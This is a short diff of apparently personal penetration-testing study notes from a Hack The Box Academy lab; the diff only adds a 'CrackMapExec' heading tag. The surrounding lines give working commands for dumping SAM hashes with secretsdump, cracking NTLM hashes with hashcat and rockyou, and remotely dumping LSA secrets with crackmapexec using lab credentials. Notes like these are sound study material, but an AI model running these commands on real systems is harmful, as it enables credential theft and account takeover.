@@ -36,6 +36,7 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -s
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 ```
 
+#CrackMapExec 
 ##### Dumping LSA Secrets Remotely:
 ```shell
 crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
